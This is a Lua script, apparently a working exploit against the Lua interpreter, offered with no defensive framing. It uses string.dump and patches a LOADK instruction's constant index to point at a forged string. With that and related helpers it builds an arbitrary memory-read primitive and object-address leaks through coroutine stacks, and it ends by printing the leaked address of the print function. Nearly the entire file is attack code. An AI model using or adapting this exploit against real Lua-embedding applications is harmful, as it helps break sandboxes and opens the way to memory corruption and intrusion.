-- 2021.10.08. 22:04 수정
collectgarbage("stop")

local function escapeString(s)
	local i = 1
	local len = #s
	while(i <= len) do
		if(s:byte(i) == 0x25) then
			s = s:sub(1, i) .. '%' .. s:sub(i+1)
			len = len + 1
			i = i + 1
		end
		i = i + 1
	end
	return s
end

local function numTo32L(n)
	local a1 = n % 0x100
	local q = n  // 0x100
	local a2 = q % 0x100
	q = q // 0x100
	local a3 = q % 0x100
	q = q // 0x100
	local a4 = q
	return string.char(a1, a2, a3, a4)
end

-- number to 64bit string

local function numTo64L(n)
	local a1 = n % 0x100
	local q = n // 0x100
	local a2 = q % 0x100
	q = q // 0x100
	local a3 = q % 0x100
	q = q // 0x100
	local a4 = q % 0x100
	q = q // 0x100
	local a5 = q % 0x100
	q = q // 0x100
	local a6 = q % 0x100
	q = q // 0x100
	local a7 = q % 0x100
	q = q // 0x100
	local a8 = q % 0x100
	return string.char(a1, a2, a3, a4, a5, a6, a7, a8)
end


local function createLOADK(ra, kb)
	local Bx = kb * (1 << 15)
	local i = 0x03 + (ra * (1 << 7)) + Bx
	i = numTo32L(i)
	return i
end


local function _objAddr(o)
	return tonumber(tostring(o):match('^%a+: 0x(%x+)$'),16)
end



local function readAddr(addr)
	collectgarbage()

	local function foo()
		local a="a" a="b" a="c" 
		return (#a)
	end

	local _k={}
	local _str={}
	if (tostring(_k)>tostring(_str)) then
		local _t = _str
		_str = _k
		_k = _t
	end
	
	local _intermid={}

	local _str_addr = _objAddr(_str)
	-- table in 64bit is 56B long


	local _addr = numTo64L(addr - 16)
	local padding_a = string.rep('\65', 8) -- 0x41 padding
	local padding_b = string.rep('\20', 15) -- LUA_VLNGSTR tag padding

	collectgarbage()
	_str = nil
	collectgarbage()
	
	_str = padding_a .. _addr .. padding_b;	

	foo = string.dump(foo)
	foo = foo:gsub(escapeString(createLOADK(0,2)), -- 0 , 0, 32
			escapeString(createLOADK(0, (_str_addr+0x20 - _objAddr(_k))/16 ))) -- 0, 

	collectgarbage()
	_k=nil
	collectgarbage()

	foo = load(foo)
	return foo()
end



local function memcpy(src, size)
	local dest = ''
	--pointer size is 8B
	local m = size % 8
	for i=0, size-m-8, 8 do
		dest = dest .. numTo64L(readAddr(src + i))
	end
	if (m ~= 0) then
		
		local i = (size - m)/8	--Note: size%8 != 0
		dest = dest .. numTo64L(readAddr(src + i)):sub(1,m)
	end
	return dest
end



local function objAddr(o)
	local known_objects = {}
	known_objects['thread'] = 1; known_objects['function']=1; known_objects['userdata']=1; known_objects['table'] = 1;
	local tp = type(o)
	if (known_objects[tp]) then return _objAddr(o) end

	local f = function(a) coroutine.yield(a) end
	local t = coroutine.create(f)
	local top = readAddr(_objAddr(t) + 0x10) --The field top is in offset 0x10

	coroutine.resume(t, o)
	local addr = readAddr(top )

	return addr
end


print("readAddr : ", readAddr(objAddr(print)))